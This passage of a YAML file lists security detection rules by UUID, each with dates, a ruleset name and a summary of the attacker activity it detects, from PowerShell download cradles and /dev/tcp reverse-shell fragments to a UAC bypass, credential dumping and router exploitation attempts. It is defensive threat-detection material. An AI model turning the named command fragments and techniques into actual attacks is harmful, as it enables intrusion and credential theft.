  Updated-Date: '2024_09_04'
6bd75993-9888-4f91-9404-e1e4e4e34b77:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bac3ac3a41fd8b36607ddea0108127a8
  Ruleset: core
  Summary: This rule detects the execution of the LocalPotato proof-of-concept (POC)
    tool on Windows systems. LocalPotato is used for privilege escalation and defense
    evasion by leveraging specific vulnerabilities (such as CVE-2023-21746). The detection
    is based on distinct Portable Executable (PE) metadata, command-line invocation
    patterns, and specific hash values. These indicators help identify the malicious
    activity associated with the use of LocalPotato, which can compromise system security.
  Updated-Date: '2024_09_03'
6bfb8fa7-b2e7-4f6c-8d9d-824e5d06ea9e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1708fe2d1fcf155b899417c54495b9c9
  Ruleset: core
  Summary: This rule detects the obfuscated use of environment variables in executing
    PowerShell commands. Specifically, it identifies patterns where PowerShell scripts
    use environment variables with obfuscation techniques to execute potentially malicious
    commands, leveraging cmd.exe and various string formatting methods. This type
    of activity is typically associated with defense evasion and execution tactics
    employed by attackers.
  Updated-Date: '2024_09_03'
6c0a7755-6d31-44fa-80e1-133e57752680:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fd60e9052ca74f72b9631be031fcfd64
  Ruleset: sigmahq
  Summary: This rule detects when the "Windows Defender Threat Protection" service
    is disabled on a Windows system. This is identified by monitoring system logs
    for events generated by the Service Control Manager (EventID 7036) when the Windows
    Defender Antivirus Service enters a stopped state. The monitoring includes consideration
    for different language localizations, such as French. This detection is significant
    as disabling Windows Defender can be an indicator of malicious activity aiming
    to evade defenses. However, it can also occur due to legitimate administrative
    actions or automatic updates that temporarily stop the service.
  Updated-Date: '2024_09_04'
6c130acd-0adb-4545-bcc4-2e85d0883c9a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bf474dd57049c2719ee618b783fefac9
  Ruleset: emerging-threats
  Summary: "This rule detects the creation of scheduled tasks associated with the\
    \ Kapeka backdoor, focusing on specific attributes such as certain file paths,\
    \ command line flags, and the names of the tasks. The Kapeka backdoor utilizes\
    \ scheduled tasks named \u201COneDrive\u201D or \u201CSens Api\u201D and executes\
    \ commands involving \"rundll32\" and \".wll\" files. By monitoring these indicators\
    \ in the Windows Security log, specifically Event ID 4698, the rule helps identify\
    \ malicious activities for persistence and privilege escalation."
  Updated-Date: '2024_09_03'
6c304b02-06e6-402d-8be4-d5833cdf8198:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d9d4ad26d7a82e9db88eaddcc63f4108
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious modifications to the SentinelOne
    context menu scan command when altered by any process other than SentinelOne.
    Specifically, it monitors changes to the registry path associated with the context
    menu scan command and excludes modifications made by the default SentinelOne scan
    binaries installed in typical directories. This helps identify unauthorized tampering
    that could indicate persistence techniques being used by malicious actors.
  Updated-Date: '2024_09_04'
6c4e2f43-d94d-4ead-b64d-97e53fa2bd05:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 115d35c5dc2c0001a6c5c7caebe73daf
  Ruleset: sigmahq
  Summary: This rule detects the creation of cron files or entries in specific cron
    directories on a Linux system, which may indicate an attempt at establishing persistence.
    The monitored directories include paths such as '/etc/cron.d/', '/etc/cron.daily/',
    '/etc/cron.hourly/', '/etc/cron.monthly/', '/etc/cron.weekly/', and '/var/spool/cron/crontabs/'.
    Additionally, the rule looks for changes to '/etc/cron.allow', '/etc/cron.deny',
    and '/etc/crontab'. These cron directories and files are commonly used by both
    administrators and adversaries to schedule tasks, making them critical points
    for monitoring to detect unauthorized persistent activities.
  Updated-Date: '2024_09_04'
6c6c6282-7671-4fe9-a0ce-a2dcebdc342b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6d07e9c07a9876211967b1fd3fa9bbe4
  Ruleset: sigmahq
  Summary: This rule detects the utilization of PowerShell commands that involve executing
    XML commands, potentially indicating adversarial behavior. Specific patterns include
    the creation of new objects via 'New-Object', manipulation of XML documents using
    'System.Xml.XmlDocument' and '.Load', and execution of commands through 'Invoke-Expression',
    'Invoke-Command', 'IEX', or 'ICM'. The rule leverages Script Block Logging on
    Windows systems to identify these activities, as PowerShell can be used to perform
    various actions including information discovery and code execution. Legitimate
    administrative scripts may trigger this detection as false positives.
  Updated-Date: '2024_09_04'
6c6d9280-e6d0-4b9d-80ac-254701b64916:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 98780f42667f4ac9319caa8200a29417
  Ruleset: core
  Summary: "This rule detects potential NTLM coercion attacks utilizing the `certutil.exe`\
    \ utility in Windows with the \u2018syncwithWU\u2019 flag. NTLM coercion is a\
    \ tactic where an attacker forces a system to authenticate with a malicious server,\
    \ potentially leaking sensitive credential information. The detection specifically\
    \ looks for instances where `certutil.exe` is invoked with the \u2018syncwithWU\u2019\
    \ flag, which is an unusual and suspicious use of the tool, often indicative of\
    \ malicious intent. Certutil is a command-line program used to manage certificates,\
    \ and its misuse in this context can signal an attempt to evade defenses and manipulate\
    \ certificate services."
  Updated-Date: '2024_09_03'
6c7defa9-69f8-4c34-b815-41fce3931754:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 86469c0d3afe12583c673e47dc30372f
  Ruleset: emerging-threats
  Summary: This rule detects potential exploitation attempts of CVE-2023-1389, an
    unauthenticated command injection vulnerability in the TP-Link Archer AX21 router.
    The rule identifies specific HTTP GET and POST requests containing certain URI
    patterns and keywords indicating attempts to exploit the vulnerability. The vulnerability
    has been noted as part of the Mirai botnet arsenal and poses a risk of unauthorized
    command execution on affected devices.
  Updated-Date: '2024_09_03'
6c82cf5c-090d-4d57-9188-533577631108:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f057ccbc961fd317823cdbc6e4e110e7
  Ruleset: core
  Summary: This rule detects a suspicious crash of the Microsoft Malware Protection
    Engine by monitoring Windows Error Reporting events. Specifically, it checks for
    EventID 1001 and looks for occurrences of 'MsMpEng.exe' and 'mpengine.dll' within
    the event data, indicating that the antimalware engine process and its associated
    DLL file have encountered a crash. This activity could potentially be indicative
    of defense evasion techniques employed by malware to disable or bypass security
    measures.
  Updated-Date: '2024_09_03'
6c8fbee5-dee8-49bc-851d-c3142d02aa47:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9d12d3fec37c0318f410413f5d9d25bf
  Ruleset: core
  Summary: This rule detects suspicious tampering of Discretionary Access Control
    Lists (DACLs) on a service using the `sc.exe` tool to grant access to potentially
    unauthorized trustees. `sc.exe` is a Windows utility used for service management,
    and modifications using this tool to set Security Descriptors (`sdset`) can indicate
    an attempt to override existing access restrictions for services. The presence
    of specific user rights identifiers such as Interactively logged-on user (`;IU`),
    Built-in administrators (`;BA`), Local system (`;SY`), Service logon user (`;SU`),
    and Everyone (`;WD`) in the command line is monitored to detect such activities.
  Updated-Date: '2024_09_03'
6c96fc76-0eb1-11eb-adc1-0242ac120002:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e8089a6168686ea25564812baca64883
  Ruleset: core
  Summary: This rule detects the obfuscated use of stdin to execute PowerShell commands
    through the command prompt (cmd.exe) on Windows systems. Specifically, it identifies
    patterns where cmd.exe is used with parameters such as /c or /r in combination
    with PowerShell commands that include "noexit" or input redirection techniques.
    The rule aims to uncover instances where attackers use these methods to evade
    detection by obscuring the execution flow, potentially pointing to malicious activities
    involving PowerShell scripts downloaded and executed via network requests.
  Updated-Date: '2024_09_03'
6cc2b61b-d97e-42ef-a9dd-8aa8dc951657:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 42af0ab09ce4bad8c42656dbf17c303b
  Ruleset: sigmahq
  Summary: This rule detects instances when unauthorized access to an application
    is attempted through Okta. The detection is based on a specific display message
    indicating such an event. There may be false positives if a user mistakenly believes
    they had access.
  Updated-Date: '2024_09_04'
6cc5fceb-9a71-4c23-aeeb-963abe0b279c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e25eb4d7989c5e02dfded67d7dd12c12
  Ruleset: sigmahq
  Summary: This rule detects suspicious commands involving the use of `/dev/tcp` or
    `/dev/udp` on Linux systems, indicating potential reconnaissance activity. Examples
    include commands like `cat </dev/tcp/`, `exec 3<>/dev/tcp/`, `echo >/dev/tcp/`,
    and various forms of bash or sh invocations that redirect input-output to or from
    `/dev/tcp/`. These commands are typically used for network communications in a
    way that may bypass traditional monitoring controls, suggesting malicious behavior
    akin to port scanning or remote shell execution.
  Updated-Date: '2024_09_04'
6d1058a4-407e-4f3a-a144-1968c11dc5c3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0f99bf2c580260b5765f6569639347dc
  Ruleset: emerging-threats
  Summary: This rule detects suspicious process executions where Sysmon is the parent
    process, which may indicate exploitation activities such as CVE-2022-41120. It
    identifies situations where processes like `Sysmon.exe` or `Sysmon64.exe` initiate
    other processes, excluding legitimate system processes and error handlers to reduce
    false positives. Recognizing these unusual parent-child process relationships
    in the Windows environment helps in identifying potential privilege escalation
    attempts or other malicious activities targeting system security.
  Updated-Date: '2024_09_03'
6d3a3952-6530-44a3-8554-cf17c116c615:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 08a9c8ccce23b0bc8d2f6bbc8a116e4c
  Ruleset: sigmahq
  Summary: This rule detects potential unauthorized searches for Office tokens via
    the command line interface (CLI) by identifying the presence of specific string
    sequences, such as "eyJ0eX". This string is typically associated with the beginning
    of a JSON Web Token (JWT) used by Office and similar applications, and its detection
    could indicate an attempt to access sensitive tokens.
  Updated-Date: '2024_09_04'
6d444368-6da1-43fe-b2fc-44202430480e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0295a804694b74dc7e3f86f6be0ef075
  Ruleset: sigmahq
  Summary: This rule detects when there is a failed DNS zone transfer on the Windows
    DNS Server. The failure is identified by Event ID 6004, which indicates that the
    DNS server received a request for a zone transfer for a non-existent or non-authoritative
    zone. This can be indicative of reconnaissance activities as part of a more extensive
    attack strategy.
  Updated-Date: '2024_09_04'
6d44fb93-e7d2-475c-9d3d-54c9c1e33427:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4b2e5a742fbed720f697c50c99246a3c
  Ruleset: sigmahq
  Summary: This rule detects a suspicious download using the Background Intelligent
    Transfer Service (BITS) client from a fully qualified domain name (FQDN) that
    is considered unusual. Adversaries may exploit BITS jobs to persistently execute
    or clean up after malicious payloads. The rule specifically monitors for EventID
    16403, filtering out common and legitimate remote domains such as those ending
    in ".azureedge.net", ".com", ".sfx.ms", and "download.mozilla.org".
  Updated-Date: '2024_09_04'
6d580420-ff3f-4e0e-b6b0-41b90c787e28:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 42de76bda120e3e2dbf0c4f6d12b57b9
  Ruleset: core
  Summary: This rule detects remote RPC calls utilized by SharpHound, a tool used
    for Active Directory (AD) reconnaissance, to map remote connections and determine
    local group membership. It monitors the EventLog for RPCFW, focusing on EventID
    3, InterfaceUuid 4b324fc8-1670-01d3-1278-5a47bf6ee188, and OpNum 12 to identify
    these specific activities. This detection method is crucial for identifying unauthorized
    use of SharpHound for querying and collecting detailed information about AD environments.
  Updated-Date: '2024_09_03'
6d5b8176-d87d-4402-8af4-53aee9db7b5d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a862c51b716dfc5d57f299c092feff40
  Ruleset: emerging-threats
  Summary: This rule detects a potential exploitation attempt of an undocumented Windows
    Server Pre-Authentication Remote Code Execution (RCE). It monitors the creation
    of processes where both the parent and child processes are instances of 'svchost.exe'
    with command lines containing the '-k DHCPServer' argument and executed by the
    'NETWORK SERVICE' user across various language settings. This is indicative of
    suspicious activity that may exploit a vulnerability in the Windows Server.
  Updated-Date: '2024_09_03'
6d844f0f-1c18-41af-8f19-33e7654edfc3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c39f3b0aaea34669caef525eee0a7137
  Ruleset: core
  Summary: This rule detects the creation or modification of local user accounts and
    remote authentication configurations on Cisco devices. It looks for specific keywords
    like 'username' and 'aaa' in logs from Cisco's Authentication, Authorization,
    and Accounting (AAA) services. The aim is to identify potential unauthorized access
    or configuration changes, which could be indicative of persistence techniques
    or abuse of remote services.
  Updated-Date: '2024_09_03'
6d8a7cf1-8085-423b-b87d-7e880faabbdf:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 702ab2f8390892b2129fceadd9f386e9
  Ruleset: sigmahq
  Summary: This rule detects the execution of the nscurl utility on macOS systems
    to download files. The nscurl tool, which can be utilized for diagnosing App Transport
    Security issues and interacting with web resources, is monitored by identifying
    specific command-line arguments associated with file downloading, such as '--download',
    '--output', and related options. The rule aims to identify potential abuse of
    nscurl for purposes such as defense evasion and command-and-control activities
    under attack techniques like T1105. Legitimate use cases, such as by system administrators,
    are acknowledged as potential false positives.
  Updated-Date: '2024_09_04'
6d8c3d20-a5e1-494f-8412-4571d716cf5c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fc793fef806702ad0d4ae4a61349f383
  Ruleset: sigmahq
  Summary: This rule detects programs connecting to uncommon destination ports such
    as 8080 and 8888 on a Windows system. It specifically looks for network connections
    that are initiated, excluding connections to local and private IP ranges as well
    as connections originating from system directories like 'C:\Program Files' and
    'C:\Program Files (x86)'. The intent is to identify potentially suspicious activity
    related to persistence or command-and-control techniques as outlined in attack
    technique T1571.
  Updated-Date: '2024_09_04'
6da2c9f5-7c53-401b-aacb-92c040ce1215:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bc472a987551325a27037a62ef52b4b9
  Ruleset: core
  Summary: This rule detects the use of the Windows Time Service (w32tm) as a timing
    mechanism when it is configured with specific command-line arguments. It identifies
    instances where the w32tm.exe process is executed with parameters like '/stripchart',
    '/computer:', '/period:', '/dataonly', and '/samples:'. These arguments are typically
    used to monitor and log time-related data, which in some cases can be leveraged
    as a delay tactic by malicious actors.
  Updated-Date: '2024_09_03'
6daac7fc-77d1-449a-a71a-e6b4d59a0e54:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b8ac246fb9ae2e503ff84a2307447fd3
  Ruleset: core
  Summary: This rule detects failed attempts to call the 'LsaRegisterLogonProcess'
    function in Windows security logs, which signifies that the application trying
    to make the call lacked the necessary SeTcbPrivilege privilege. This function
    is integral for identifying whether an application is authorized as a logon process.
    Notably, tools like Rubeus, used for manipulating Kerberos tickets, might attempt
    to access Local Security Authority (LSA) in this manner, potentially indicating
    lateral movement or privilege escalation attempts within a network.
  Updated-Date: '2024_09_03'
6ddab845-b1b8-49c2-bbf7-1a11967f64bc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e70f00e631bcccaee289df23c81736ab
  Ruleset: sigmahq
  Summary: This rule detects the deletion of files by the utility Sysinternals SDelete
    on Windows systems. SDelete is a command-line utility for securely deleting files,
    which renames files to a typical name pattern before deletion. The rule looks
    for filenames that end with patterns such as '.AAA' or '.ZZZ' while excluding
    specific known false positives, like those related to Wireshark dictionary files.
    This detection aims to identify potential defense evasion techniques where SDelete
    is used to remove traces of files.
  Updated-Date: '2024_09_04'
6e22722b-dfb1-4508-a911-49ac840b40f8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f051a639892f7e42283988cdbe86a730
  Ruleset: core
  Summary: This rule detects the execution of Mstsc.exe, the Microsoft Terminal Services
    Client application used for RDP (Remote Desktop Protocol) connections, when initiated
    through a local ".rdp" file stored in suspicious directory paths. It scrutinizes
    command lines that include ".rdp" files and flags activity if those files are
    found in unusual directories like '\Users\Public\', '\Windows\Temp\', or similar
    locations known to be atypical for legitimate RDP session files. This could indicate
    potential malicious activity aiming to establish unauthorized remote connections.
  Updated-Date: '2024_09_03'
6e2a900a-ced9-4e4a-a9c2-13e706f9518a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c7786313546c9c1ca8f39ba4a751c6b1
  Ruleset: core
  Summary: This rule detects the presence of default filenames that result from the
    execution of CrackMapExec and Impacket-secretsdump targeting endpoints. CrackMapExec
    and Impacket-secretsdump are tools used primarily for remote credential dumping,
    which can help attackers obtain sensitive credential information from systems.
    The detection focuses on identifying specific file creation patterns, particularly
    temporary files generated in the Windows System32 directory by the svchost.exe
    process.
  Updated-Date: '2024_09_03'
6e30c82f-a9f8-4aab-b79c-7c12bce6f248:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f6f2c685dba283aab3d6ddc344c286ec
  Ruleset: sigmahq
  Summary: This rule detects the usage of Bitsadmin, a command-line tool for managing
    BITS (Background Intelligent Transfer Service) jobs, to download a file to uncommon
    target folders such as %AppData%, %temp%, %tmp%, \AppData\Local\, and C:\Windows\Temp\.
    This behavior can indicate an attempt to evade defenses or establish persistence
    by disguising the download process in commonly overlooked locations within the
    file system.
  Updated-Date: '2024_09_04'
6e4dcdd1-e48b-42f7-b2d8-3b413fc58cb4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f03d8806974c8cfa25e5b8766e2ccaf1
  Ruleset: sigmahq
  Summary: This rule detects unusual child processes spawned by the macOS Script Editor
    utility, which can be indicative of potentially malicious activity. The rule focuses
    on identifying when specific command-line utilities such as curl, bash, sh, zsh,
    dash, fish, osascript, mktemp, chmod, php, nohup, openssl, plutil, PlistBuddy,
    xattr, sqlite, funzip, and popen are executed. Additionally, it flags instances
    where processes containing "python" or "perl" in their names are launched from
    the Script Editor. This activity can be associated with various tactics such as
    execution, persistence, and defense evasion.
  Updated-Date: '2024_09_04'
6e61ee20-ce00-4f8d-8aee-bedd8216f7e3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3ffe3f986f69e2cc5e4925a5a577daeb
  Ruleset: core
  Summary: This rule detects updates to the AWS GuardDuty list of trusted IPs, which
    could potentially be used to disable security alerts against malicious IP addresses.
    The detection is triggered by monitoring the "CreateIPSet" events from the GuardDuty
    service in AWS CloudTrail.
  Updated-Date: '2024_09_03'
6e78b74f-c762-4800-82ad-f66787f10c8a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 828ec1e53a01a5778099b0970b120659
  Ruleset: core
  Summary: This rule detects potential DLL sideloading involving the file rcdll.dll
    within a Windows environment. DLL sideloading is a technique often used by attackers
    to execute malicious code through the misuse of legitimate applications. The detection
    rule examines log entries for instances where rcdll.dll is loaded, excluding cases
    where it is loaded from typical development tool directories such as Microsoft
    Visual Studio or Windows Kits. By focusing on suspicious loading patterns outside
    these standard directories, this rule aims to identify unauthorized or malicious
    activity that could be indicative of defense evasion or privilege escalation tactics.
  Updated-Date: '2024_09_03'
6e78f90f-0043-4a01-ac41-f97681613a66:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f887ed8714cafab835d6a0f36d26dad1
  Ruleset: sigmahq
  Summary: This rule detects instances where an MSSQL service running on an OpenCanary
    node experiences a login attempt via Windows Authentication.
  Updated-Date: '2024_09_04'
6e897651-f157-4d8f-aaeb-df8151488385:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b55ee619eae5d436fe69219c149ebe6a
  Ruleset: sigmahq
  Summary: This rule detects suspicious methods of downloading files or content using
    PowerShell. It monitors process creation events on Windows systems for specific
    PowerShell commands such as `.DownloadString(`, `.DownloadFile(`, `Invoke-WebRequest`,
    and `iwr`. These commands are commonly used in various attack techniques related
    to command-and-control or execution, making them indicative of potentially malicious
    activity. While the use of these commands can sometimes be legitimate, their presence
    warrants further investigation to distinguish between benign scripts or tools
    and malicious actions.
  Updated-Date: '2024_09_04'
6e90ae7a-7cd3-473f-a035-4ebb72d961da:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 69ac3f16f0856b796d61462a31541b97
  Ruleset: core
  Summary: This rule detects processes that create temporary files associated with
    the PCRE.NET package, specifically those located in the directory path \AppData\Local\Temp\ba9ea7344a4a5f591d6e5dc32a13494b\.
    The detection focuses on monitoring file events on Windows systems to identify
    such activities. The creation of these temporary files could indicate the execution
    of tasks related to the PCRE.NET package.
  Updated-Date: '2024_09_03'
6e968eb1-5f05-4dac-94e9-fd0c5cb49fd6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ab5cad4380a83a0bb0eb099a77945c5a
  Ruleset: sigmahq
  Summary: This rule detects an uncommon parent process of "LINK.EXE," a Microsoft
    incremental linker utility usually bundled with Visual Studio. Tools like editbin.exe,
    dumpbin.exe, and lib.exe within the Visual Studio suite often hardcode calls to
    LINK.EXE, potentially allowing an attacker to sideload a malicious binary named
    "link.exe" if these utilities are executed from unconventional locations. By filtering
    out known legitimate locations of these utilities, the rule identifies unusual
    parent processes of LINK.EXE that might be suspicious or malicious.
  Updated-Date: '2024_09_04'
6ea3bf32-9680-422d-9f50-e90716b12a66:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8c1fe9272fb94db425f30bd3d1c16eb9
  Ruleset: core
  Summary: This rule detects an unfixed method for bypassing User Account Control
    (UAC) on Windows 10 using the WSReset.exe file, which is associated with the Windows
    Store. The method involves running a binary file contained in a low-privilege
    registry entry, potentially enabling privilege escalation and defense evasion.
  Updated-Date: '2024_09_03'
6ea858a8-ba71-4a12-b2cc-5d83312404c7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6ef2da9529640b6dfeedf0653fb84ee7
  Ruleset: core
  Summary: This rule detects files written by tools that exploit the HiveNightmare
    vulnerability (CVE-2021-36934), which allows unauthorized access to the Security
    Accounts Manager (SAM) database on Windows systems. It identifies specific target
    filenames associated with various versions of the exploit, including those created
    by Go, C++, and PowerShell implementations, as well as a particular C# version
    stored in the Windows temp directory.
  Updated-Date: '2024_09_03'
6ec820f2-e963-4801-9127-d8b2dce4d31b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5b57586b3cad62ad3a2a7a3c4d8e2e40
  Ruleset: core
  Summary: This rule detects suspicious user agent strings in proxy logs that are
    associated with known Advanced Persistent Threat (APT) malware. It highlights
    specific user agent patterns related to various APT instances and malware, including
    but not limited to APT Backspace, GrizzlySteppe, ChopStick, Naikon, SnowGlobe
    Babar, Sofacy, Derusbi, Unit78020, Winnti, APT17, Bronze Butler, TSCookie, Delphi
    downloader, VPNFilter, KerrDown, APT33, Hidden Cobra, Strong Pity, Mustang Panda,
    BackdoorDiplomacy, Sparkling Goblin SideWalk, LitePower stager, and RedCurl Downloader.
    The user agent strings identified signify command-and-control mechanisms commonly
    used by these threats, and the presence of these strings in proxy logs can indicate
    potential malicious activities by related malware.
  Updated-Date: '2024_09_03'
6ec86d9e-912e-4726-91a2-209359b999b9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cab9641354e62dc91197997df1ee432a
  Ruleset: sigmahq
  Summary: This rule detects the loading of "Amsi.dll" by specific processes often
    categorized as living off the land binaries (LOLBINs), such as ExtExport.exe,
    odbcconf.exe, regsvr32.exe, and rundll32.exe. These processes can be used to execute
    malicious activities while avoiding detection, a technique sometimes referred
    to as "PowerShell without PowerShell." The detection of such activity could indicate
    a defense evasion tactic in progress.
  Updated-Date: '2024_09_04'
6eea1bf6-f8d2-488a-a742-e6ef6c1b67db:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 58d0a17c7efccb24da58033ef7827ba0
  Ruleset: core
  Summary: This rule detects the execution of UNIX/Linux scripts through the SCX RunAsProvider's
    ExecuteScript function, identifying scripts that are created as temporary files
    in the `/tmp` folder with the `scx*` prefix. These scripts are then executed from
    the `/etc/opt/microsoft/scx/conf/tmpdir/` directory, having the same `scx*` prefix.
    It monitors the process creation by the user `root` and captures commands involving
    this pattern to identify potential misuse. SCXcore is associated with the Microsoft
    Operations Manager UNIX/Linux Agent and is used across different Microsoft products
    such as Microsoft Operations Manager, Microsoft Azure, and Microsoft Operations
    Management Suite.
  Updated-Date: '2024_09_03'
6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 16844808e1674f7e72ccac9d3a2b1410
  Ruleset: core
  Summary: This rule detects potentially suspicious child processes spawned by "regsvr32.exe".
    Regsvr32.exe is a command line utility for registering and unregistering OLE controls
    such as DLLs and ActiveX controls in the Windows operating system. The rule identifies
    unusual child processes such as "calc.exe", "cscript.exe", "explorer.exe", "mshta.exe",
    "net.exe", "net1.exe", "nltest.exe", "notepad.exe", "powershell.exe", "pwsh.exe",
    "reg.exe", "schtasks.exe", "werfault.exe", and "wscript.exe" that indicate possible
    misuse or exploitation of regsvr32.exe for malicious purposes, including defense
    evasion techniques. Notably, the rule includes a filter to exclude benign instances
    of "werfault.exe" with specific command line arguments. Although false positives
    are unlikely, it is advised to apply additional filters if necessary to refine
    detection accuracy.
  Updated-Date: '2024_09_03'
6f156c48-3894-4952-baf0-16193e9067d2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 64a4934b2d1a849d33a2bd3e09049cb4
  Ruleset: core
  Summary: This rule detects blocked image load events involving revoked certificates
    by code integrity mechanisms in Windows. These events are signified by EventID
    3036 and indicate that the system could not verify the integrity of a file because
    its signing certificate has been revoked. It is recommended to check with the
    publisher for a new signed version of the kernel module.
  Updated-Date: '2024_09_03'
6f4191bb-912b-48a8-9ce7-682769541e6d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f833e5b19b2c162a353d9f5bc579763e
  Ruleset: sigmahq
  Summary: This rule detects the misuse of `msiexec.exe` to execute arbitrary DLLs,
    which may be indicative of malicious activity. `msiexec.exe` is a command-line
    utility for the Windows Installer, typically used for executing installation packages
    (.msi files). Malicious actors can exploit this utility to proxy the execution
    of harmful payloads. The rule monitors the specific command-line invocation patterns
    of `msiexec.exe` and distinguishes legitimate uses by filtering out known safe
    command sequences, such as those associated with Apple Software Update and Bonjour
    services. This helps in identifying potentially harmful behaviors while minimizing
    false positives from legitimate scripts.
  Updated-Date: '2024_09_04'
6f535e01-ca1f-40be-ab8d-45b19c0c8b7f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d93261b4bf78b5c126226b620d32028d
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "Ldifde.exe" tool on Windows systems
    with the import flag "-i". This usage can potentially be exploited to include
    HTTP-based arguments that facilitate the arbitrary download of files from a remote
    server. The rule monitors for specific indicators in the process creation logs,
    such as the presence of "ldifde.exe" in the image name and the combination of
    "-i" and "-f" in the command line arguments. The identified behavior may signify
    attempts at command-and-control or defense evasion activities through the misuse
    of legitimate Windows utilities.
  Updated-Date: '2024_09_04'
6f55f047-112b-4101-ad32-43913f52db46:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 48019e7b4f1cb70610a27e42dc39e614
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts targeting SonicWall SSL/VPN devices
    through the Jarrewrite vulnerability. It focuses on web server logs, specifically
    identifying suspicious activity in URL queries containing '/cgi-bin/jarrewrite.sh'
    and unusual user agents with strings like ':;', '() {', and '/bin/bash -c', which
    are indicative of command injection attempts. This malicious behavior is associated
    with initial access tactics often used by attackers to breach systems. The rule
    considers unknown cases as potential false positives and is rated with a high
    severity level due to its critical impact.
  Updated-Date: '2024_09_03'
6f583da0-3a90-4566-a4ed-83c09fe18bbf:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 29756b1d1d8f3163bbef763fbbcfcbdd
  Ruleset: core
  Summary: This rule detects instances where a user account is created and subsequently
    deleted within a short time frame. It monitors Azure audit logs for messages indicating
    successful account creation and deletion events. This behavior may indicate an
    attempt to evade defenses or misuse account privileges. Potential false positives
    could include legitimate administrative actions.
  Updated-Date: '2024_09_03'
6f6afac3-8e7a-4e4b-9588-2608ffe08f82:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7a7926d7ee3c73e4f6280b33c4c87baa
  Ruleset: emerging-threats
  Summary: This rule detects potential activity involving the CSharp Streamer RAT
    by identifying the loading of a .NET executable image using a default file name
    and path commonly associated with this tool. It specifically looks for files loaded
    from within the path `\\AppData\\Local\\Temp\\` that match a pattern of `dat`
    followed by four alphanumeric characters and a `.tmp` file extension. This behavior
    is indicative of the CSharp Streamer RAT, a remote access Trojan that facilitates
    command-and-control operations.
